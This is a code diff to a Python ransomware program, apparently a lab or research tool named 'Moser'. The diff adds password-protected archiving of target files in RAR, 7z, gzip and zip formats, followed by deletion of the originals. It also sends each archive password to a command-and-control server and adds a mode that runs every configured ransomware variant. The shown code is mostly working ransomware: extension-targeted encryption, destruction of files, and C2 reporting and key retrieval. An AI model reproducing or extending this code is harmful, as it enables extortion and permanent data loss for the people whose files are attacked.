@@ -11,6 +11,7 @@ import rarfile
 import gzip
 import shutil
 from cryptography.hazmat.primitives import serialization
+import subprocess
 
 # ---
 # To decrypt files encrypted with pure symmetric algorithms (AES, RC4, ChaCha20),
@@ -77,28 +78,79 @@ def rsa_encrypt(data, public_key):
     return encrypted
 
 def create_password_protected_zip(files, output_path, zip_type, password):
-    if zip_type == "7zip":
-        with py7zr.SevenZipFile(output_path, 'w', password=password) as archive:
+    deleted = False
+    if zip_type == "RAR":
+        winrar_path = r"C:\Program Files\WinRAR\WinRAR.exe"
+        target_dir = r"D:\Cyber\Malware\Updated\Moser\target"
+        os.makedirs(target_dir, exist_ok=True)
+        archive_name = os.path.basename(output_path)
+        output_path = os.path.join(target_dir, archive_name)
+        cmd = [winrar_path, 'a', f'-hp{password}', output_path]
+        cmd.extend(files)
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"[ERROR] WinRAR failed: {result.stderr}")
+            else:
+                print(f"RAR archive created with password at {output_path}")
+                send_status_to_c2("archive_password", {"archive_type": "RAR", "archive_path": output_path, "zip_password": password})
+                for file in files:
+                    try:
+                        os.remove(file)
+                    except Exception as e:
+                        print(f"[WARN] Could not delete {file}: {e}")
+                deleted = True
+        except FileNotFoundError:
+            print(f"[ERROR] WinRAR.exe not found at {winrar_path}. Please check the path.")
+        except Exception as e:
+            print(f"[ERROR] Failed to create RAR archive: {e}")
+        return
+    elif zip_type == "7zip":
+        try:
+            with py7zr.SevenZipFile(output_path, 'w', password=password) as archive:
+                for file in files:
+                    archive.write(file, os.path.basename(file))
+            print(f"7z archive created with password at {output_path}")
+            send_status_to_c2("archive_password", {"archive_type": "7zip", "archive_path": output_path, "zip_password": password})
             for file in files:
-                archive.write(file, os.path.basename(file))
-    
-    elif zip_type == "RAR":
-        with rarfile.RarFile(output_path, 'w', password=password) as archive:
-            for file in files:
-                archive.write(file, os.path.basename(file))
-    
+                try:
+                    os.remove(file)
+                except Exception as e:
+                    print(f"[WARN] Could not delete {file}: {e}")
+            deleted = True
+        except Exception as e:
+            print(f"[ERROR] Failed to create 7z archive: {e}")
     elif zip_type == "gzip":
-        # Note: gzip doesn't support password protection natively
-        with gzip.open(output_path, 'wb') as f:
+        try:
+            with gzip.open(output_path, 'wb') as f:
+                for file in files:
+                    with open(file, 'rb') as src:
+                        shutil.copyfileobj(src, f)
+            print(f"Gzip archive created at {output_path}")
+            send_status_to_c2("archive_password", {"archive_type": "gzip", "archive_path": output_path, "zip_password": password})
             for file in files:
-                with open(file, 'rb') as src:
-                    shutil.copyfileobj(src, f)
-    
+                try:
+                    os.remove(file)
+                except Exception as e:
+                    print(f"[WARN] Could not delete {file}: {e}")
+            deleted = True
+        except Exception as e:
+            print(f"[ERROR] Failed to create gzip archive: {e}")
     elif zip_type == "Standard_zip":
-        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as archive:
+        import pyminizip
+        rel_files = [os.path.basename(f) for f in files]
+        try:
+            pyminizip.compress_multiple(files, rel_files, output_path, password, 5)
+            print(f"ZIP archive created with password at {output_path}")
+            send_status_to_c2("archive_password", {"archive_type": "zip", "archive_path": output_path, "zip_password": password})
             for file in files:
-                archive.write(file, os.path.basename(file))
-                archive.setpassword(password.encode())
+                try:
+                    os.remove(file)
+                except Exception as e:
+                    print(f"[WARN] Could not delete {file}: {e}")
+            deleted = True
+        except Exception as e:
+            print(f"[ERROR] Failed to create ZIP archive: {e}")
 
 def ensure_rsa_keys():
     key_dir = os.path.join(os.path.dirname(__file__), 'keys')
@@ -138,15 +190,15 @@ def encrypt_and_zip_files(target_dir, ransomware_config):
     key = generate_key(enc_type)
     target_extensions = ransomware_config['targets']
     files_to_process = []
-    
     # Collect files matching target extensions
     for root, _, files in os.walk(target_dir):
         for file in files:
             if any(file.lower().endswith(ext.lower()) for ext in target_extensions):
-                files_to_process.append(os.path.join(root, file))
-    
+                full_path = os.path.join(root, file)
+                if os.path.exists(full_path):
+                    files_to_process.append(full_path)
     if not files_to_process:
-        print("No matching files found!")
+        print(f"[INFO] No matching files found for {ransomware_config['ransomware']}. Skipping.")
         return
     
     # Handle zip cases
@@ -158,6 +210,9 @@ def encrypt_and_zip_files(target_dir, ransomware_config):
     
     # Handle encryption cases
     for file_path in files_to_process:
+        if not os.path.exists(file_path):
+            print(f"[INFO] File {file_path} no longer exists. Skipping.")
+            continue
         with open(file_path, 'rb') as f:
             file_data = f.read()
         
@@ -329,17 +384,26 @@ def decrypt_files(target_dir, config):
         elif enc_type == "AES + RSA":
             encrypted_key = encrypted_data[:256]
             ciphertext = encrypted_data[256:]
+            if private_key is None:
+                print(f"[ERROR] Private key is not loaded. Skipping decryption for {file_path}.")
+                continue
             file_key = rsa_decrypt(encrypted_key, private_key)
             data = aes_decrypt(ciphertext, file_key)
         elif enc_type == "ChaCha20 + RSA":
             encrypted_key = encrypted_data[:256]
             nonce = encrypted_data[256:268]
             ciphertext = encrypted_data[268:]
+            if private_key is None:
+                print(f"[ERROR] Private key is not loaded. Skipping decryption for {file_path}.")
+                continue
             file_key = rsa_decrypt(encrypted_key, private_key)
             data = chacha20_decrypt(ciphertext, file_key, nonce)
         elif enc_type == "RC4 + RSA":
             encrypted_key = encrypted_data[:256]
             ciphertext = encrypted_data[256:]
+            if private_key is None:
+                print(f"[ERROR] Private key is not loaded. Skipping decryption for {file_path}.")
+                continue
             file_key = rsa_decrypt(encrypted_key, private_key)
             data = rc4_decrypt(ciphertext, file_key)
         else:
@@ -401,14 +465,26 @@ def fetch_decryption_key_from_c2():
         print(f"[C2] Error fetching decryption key: {e}")
         return None
 
+def test_all_ransomwares():
+    config = load_ransomware_config()
+    target_dir = r"D:\Cyber\Malware\Updated\Moser\target"
+    for ransomware_config in config:
+        print(f"\n--- Testing {ransomware_config['ransomware']} ---")
+        encrypt_and_zip_files(target_dir, ransomware_config)
+        if ransomware_config.get('zip_type', 'None') == 'None':
+            print(f"--- Decrypting files for {ransomware_config['ransomware']} ---")
+            decrypt_files(target_dir, config)
+        else:
+            print(f"[INFO] Skipping decryption for {ransomware_config['ransomware']} (archived, originals deleted)")
+
 def main():
-    target_dir = r"C:\IEH\Moser\target"
+    target_dir = r"D:\Cyber\Malware\Updated\Moser"
     if not os.path.exists(target_dir):
         print(f"Target directory {target_dir} does not exist!")
         return
     config = load_ransomware_config()
-    print("\n1. Encrypt files\n2. Decrypt files")
-    mode = input("Select mode (1/2): ")
+    print("\n1. Encrypt files\n2. Decrypt files\n3. Test all ransomwares")
+    mode = input("Select mode (1/2/3): ")
     if mode == '1':
         selected_ransomware = list_ransomware_options(config)
         if not selected_ransomware:
@@ -417,6 +493,8 @@ def main():
         encrypt_and_zip_files(target_dir, selected_ransomware)
     elif mode == '2':
         decrypt_files(target_dir, config)
+    elif mode == '3':
+        test_all_ransomwares()
     else:
         print("Invalid mode!")
 
